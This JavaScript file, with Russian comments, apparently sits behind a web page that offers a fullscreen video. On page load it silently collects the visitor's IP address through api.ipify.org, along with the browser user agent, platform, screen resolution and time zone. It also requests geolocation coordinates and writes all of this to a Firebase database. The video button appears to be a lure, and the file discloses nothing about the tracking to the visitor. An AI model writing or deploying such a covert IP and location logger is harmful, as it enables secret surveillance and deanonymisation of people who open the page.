const firebaseConfig = {
    apiKey: "mtKjKEHCh67wjSNBymzRB1Opp3cxEgY5koBXpvgY",
    authDomain: "test-6ae10.firebaseapp.com",
    databaseURL: "https://test-6ae10-default-rtdb.firebaseio.com/",
    projectId: "test-6ae10",
    storageBucket: "test-6ae10.appspot.com",
    messagingSenderId: "123456789",
    appId: "1:123456789:web:abcdef123456"
};

const app = firebase.initializeApp(firebaseConfig);
const database = firebase.database();

document.addEventListener('DOMContentLoaded', () => {
    initializeDataCollection();
});

document.getElementById('activateBtn').addEventListener('click', async (e) => {
    e.preventDefault();
    await handleActivation();
});

async function initializeDataCollection() {
    try {
        const ip = await getIP();
        const now = new Date();
        const dbPath = `visits/${formatDate(now)}/${formatTime(now)}/${ip.replace(/\./g, '_')}`;
        
        const baseData = {
            timestamp: now.toISOString(),
            userAgent: navigator.userAgent,
            os: navigator.platform,
            ip: ip,
            resolution: `${screen.width}x${screen.height}`,
            systemBit: detectSystemBit(),
            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            status: 'init'
        };

        await database.ref(dbPath).set(baseData);
        
        navigator.geolocation.getCurrentPosition(pos => {
            database.ref(dbPath).update({
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                status: 'geo_ok'
            });
        }, () => {
            database.ref(dbPath).update({ status: 'geo_denied' });
        });

    } catch (error) {
        console.error('Ошибка сбора данных:', error);
    }
}

async function handleActivation() {
    const video = document.getElementById('fullscreenVideo');
    try {
        video.style.display = 'block';
        await video.play();
        await video.requestFullscreen();
    } catch (error) {
        console.warn('Ошибка видео:', error);
        video.controls = true;
    }
}

// Вспомогательные функции
function formatDate(date) {
    return [
        date.getFullYear(),
        (date.getMonth() + 1).toString().padStart(2, '0'),
        date.getDate().toString().padStart(2, '0')
    ].join('-');
}

function formatTime(date) {
    return [
        date.getHours().toString().padStart(2, '0'),
        date.getMinutes().toString().padStart(2, '0'),
        date.getSeconds().toString().padStart(2, '0')
    ].join('-');
}

async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip || 'unknown';
    } catch {
        return 'unknown';
    }
}

function detectSystemBit() {
    const ua = navigator.userAgent;
    if (/Win64|x64|WOW64/i.test(ua)) return '64-bit';
    if (/Win32|WOW32/i.test(ua)) return '32-bit';
    return 'unknown';
}
